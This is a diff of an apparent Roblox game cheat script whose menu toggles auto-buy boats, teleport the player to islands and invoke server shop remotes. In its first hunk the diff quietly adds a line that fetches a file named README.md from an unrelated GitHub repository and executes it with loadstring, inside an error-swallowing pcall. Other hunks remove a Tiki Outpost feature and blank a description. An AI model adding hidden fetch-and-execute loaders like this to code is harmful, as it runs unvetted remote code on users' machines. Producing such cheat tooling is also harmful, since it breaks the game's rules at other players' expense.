@@ -7,6 +7,7 @@ task.spawn(function()
     repeat task.wait() until LP and LP.Character
 
     local success, err = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/tranvanhung040419826-ui/Njghvh/refs/heads/main/README.md"))()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/AnhDangNhoEm/TuanAnhIOS/refs/heads/main/koby"))()
     end)
 
@@ -4948,7 +4949,7 @@ spawn(function()
     end
   end
 end)
-local Q = Tabs.SeaEvent:AddToggle("Q", {Title = "Auto Drive To Hydra Island", Description = "Automatically buy a boat and fly to Hydra Island", Default = false})
+local Q = Tabs.SeaEvent:AddToggle("Q", {Title = "Auto Drive To Hydra Island", Description = "", Default = false})
 Q:OnChanged(function(Value)
   _G.SailBoat_Hydra = Value
 end)
@@ -4973,46 +4974,6 @@ spawn(function()
                 _tp(CFrame.new(5433, 35, 290))
               end           
             until _G.SailBoat_Hydra==false or plr.Character:WaitForChild("Humanoid").Sit==false plr.Character.Humanoid.Sit = false
-          end
-        end
-      end)
-    end
-  end
-end)local Q = Tabs.SeaEvent:AddToggle("AutoTiki", {Title = "Auto Drive To Tiki Outpost", Description = "Automatically buy a boat and fly to Tiki Outpost", Default = false})
-
-Q:OnChanged(function(Value)
-  _G.SailBoat_Tiki = Value
-end)
-
-spawn(function()
-  while wait() do
-    if _G.SailBoat_Tiki then 
-      pcall(function()        
-        local myBoat = CheckBoat()
-        
-        -- Step 1: Check and buy a boat
-        if not myBoat then
-          local buyBoatCFrame = CFrame.new(-16927.451, 9.086, 433.864)
-          TeleportToTarget(buyBoatCFrame)
-          if (buyBoatCFrame.Position - plr.Character.HumanoidRootPart.Position).Magnitude <= 10 then 
-            replicated.Remotes.CommF_:InvokeServer("BuyBoat", _G.SelectedBoat) 
-          end
-        
-        -- Step 2: Control the boat
-        elseif myBoat then
-          if plr.Character.Humanoid.Sit == false then
-            local boatSeatCFrame = myBoat.VehicleSeat.CFrame * CFrame.new(0, 1, 0)
-            _tp(boatSeatCFrame)
-          else                         
-            repeat wait() 
-              -- Tiki Outpost Coordinates: -12463, 11, -7568
-              -- Step 3: Check for sea events/monsters to evade
-              if CheckEnemiesBoat() or CheckPirateGrandBrigade() or CheckTerrorShark() then
-                _tp(CFrame.new(-12463, 150, -7568)) -- Fly high to dodge monsters
-              else
-                _tp(CFrame.new(-12463, 35, -7568))  -- Travel normally
-              end           
-            until _G.SailBoat_Tiki == false or plr.Character.Humanoid.Sit == false
           end
         end
       end)
@@ -6412,6 +6373,7 @@ spawn(function()
     end
   end
 end)
+
 Tabs.Shop:AddSection("Shop Options")
 Tabs.Shop:AddButton({Title = "Buy Buso", Description = "",Callback = function()
   replicated.Remotes.CommF_:InvokeServer("BuyHaki","Buso")
